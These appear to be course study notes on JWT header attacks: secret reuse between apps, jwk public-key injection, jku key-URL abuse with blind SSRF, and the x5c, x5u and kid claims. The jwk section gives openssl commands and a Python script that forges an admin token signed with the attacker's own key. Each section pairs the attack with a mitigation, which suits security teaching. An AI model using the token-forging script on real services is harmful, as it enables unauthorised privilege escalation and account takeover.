# Further JWT Attacks & Header Claim Exploitation

## Secret Reuse Across Applications
- If two different apps use the same symmetric secret for JWT signing, an attacker can reuse a token with elevated privileges from one context in another.
- **Lab scenario:**
  - Two domains: socialA.htb (role: moderator), socialB.htb (role: user)
  - Same secret for HS256 JWTs
  - Export moderator token from A and re-use on B to escalate privileges on B
- **Mitigation:** Always use separate secrets per app/environment.

---

## Exploiting the jwk Header Claim (Public Key Confusion)
- The `jwk` claim allows a JWT header to specify the public key that should be used to verify the asymmetric signature (e.g. RS256).
- If a server wrongly trusts attacker-supplied public keys from the header, an attacker can:
  1. Generate their own keypair (RSA):
     ```bash
     openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
     openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
     ```
  2. Extract JWK from the generated public key (Python):
     ```python
     from cryptography.hazmat.primitives import serialization
     from cryptography.hazmat.backends import default_backend
     from jose import jwk
     import jwt
     
     payload = {"user": "htb-stdnt", "isAdmin": True}
     with open("exploit_public.pem", "rb") as f:
         pub = f.read()
     pub_obj = serialization.load_pem_public_key(pub, backend=default_backend())
     jwk_dict = jwk.construct(pub_obj, algorithm='RS256').to_dict()
     with open("exploit_private.pem", "rb") as f:
         priv = f.read()
     token = jwt.encode(payload, priv, algorithm='RS256', headers={'jwk': jwk_dict})
     print(token)
     ```
  3. Use the token as session cookie for privilege escalation.
- **Mitigation:** Do not trust attacker-supplied JWK data in headers.

---

## Exploiting the jku Claim / Blind SSRF
- The `jku` (JWK Set URL) claim lets a JWT specify an external URL where public keys may be fetched.
- If the server fetches the JWK Set from attacker-controlled URLs (without proper allowlisting / validation), attacker can:
  - Host their malicious JWK Set
  - Set the `jku` claim in JWT header to their server
  - Forge tokens and sign them with their own private key
  - Server fetches keys and accepts tokens (account takeover)
- **Security note:** Blind SSRF may also be possible via the jku claim if the backend fetches arbitrary URLs.

---

## Other Dangerous Claims
- **x5c / x5u:** Certificates and certificate URLs. Can be abused like jwk/jku if trust is misplaced.
- **kid:** Key ID - used for key selection; improper handling may lead to path traversal, injection, or key confusion attacks.

---
**Always validate and strictly control which header claims can be used.** Never let untrusted users supply keys or key URLs!
